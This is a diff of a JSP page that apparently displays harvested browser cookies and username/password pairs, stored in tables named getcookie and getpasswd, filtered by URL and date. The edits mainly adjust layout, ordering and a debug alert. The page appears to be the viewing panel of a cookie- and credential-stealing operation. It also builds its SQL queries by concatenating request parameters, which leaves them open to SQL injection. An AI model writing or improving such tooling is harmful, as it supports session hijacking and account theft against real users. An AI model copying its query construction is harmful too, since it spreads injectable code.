@@ -10,7 +10,7 @@
 	String edate = request.getParameter("edate");
 	if ( edate == null ) edate = "curdate()";
 %>
-<script type="text/javascript">window.alert("<%= sdate+" / "+edate %>");</script>
+
 <html>
 <head>
 <title>top_frame</title>
@@ -27,7 +27,7 @@
 
 	<font size="3">
 
-		<table style="width:100%" border="1" width="*" cellspacing="0" cellpadding="3"	bordercolor="#6699DD">
+		<table style="width:100%" border="1" cellspacing="0" cellpadding="2"	bordercolor="#6699DD">
 
 <%
 Class.forName("com.mysql.jdbc.Driver");
@@ -36,29 +36,29 @@ Statement stmt = conn.createStatement();
 ResultSet rs = null;
 int cnt = 0;
 String url = null;
-String sql1 = "select distinct url, cookie, cdate from ibory.getcookie";
+String sql1 = "select url, cookie, cdate from ibory.getcookie";
 String sql2 = "select distinct url, id, passwd, cdate from ibory.getpasswd";
 
 	if ( s_url != null && s_url != "" ) {
 		sql1 += " where url='"+s_url+"'";
 		sql2 += " where url='"+s_url+"'";
 
-		sql1 += " and cdate between '"+sdate+"' and "+edate;
-		sql2 += " and cdate between '"+sdate+"' and "+edate;
+		sql1 += " and cdate between '"+sdate+"' and "+edate+" order by cdate desc";
+		sql2 += " and cdate between '"+sdate+"' and "+edate+" order by cdate desc";
 	} else {
-		sql1 += " where cdate between '"+sdate+"' and "+edate;
-		sql2 += " where cdate between '"+sdate+"' and "+edate;		
+		sql1 += " where cdate between '"+sdate+"' and "+edate+" order by cdate desc";
+		sql2 += " where cdate between '"+sdate+"' and "+edate+" order by cdate desc";		
 	}
 	
 	if ( type.equals("cookie") ) {
 		try {
 			rs = stmt.executeQuery(sql1);
 %>
-			<tr align="center" bgcolor="#99CCFF" height="25">
-				<td style="width:10%">SN</td>
-				<td style="width:30%">URL</td>
-				<td style="width:40%">Cookie</td>
-				<td style="width:20%">Date</td>				
+			<tr align="center" bgcolor="#99CCFF" height="20">
+				<td style="width:5%">SN</td>
+				<td style="width:20%">URL</td>
+				<td style="width:60%">Cookie</td>
+				<td style="width:15%">Date</td>				
 			</tr>
 <%
 			while(rs.next()) { 
@@ -66,8 +66,8 @@ String sql2 = "select distinct url, id, passwd, cdate from ibory.getpasswd";
 %>
 				<tr align="center">
 					<td><%= ++cnt %></td>
-					<td align="left"><a href="<%= url %>"><%= url %></a></td>
-					<td onclick="showCookie()" style="cursor:hand"><%= rs.getString("cookie") %></td>
+					<td align="left" style="max-width:150px; word-wrap: break-word;"><a href="<%= url %>"><%= url %></td>
+					<td align="left" onclick="showCookie()" style="max-width:400px; word-wrap: break-word; cursor:hand;"><%= rs.getString("cookie") %></td>
 					<td><%= rs.getString("cdate") %></td>
 				</tr>
 <%  		}
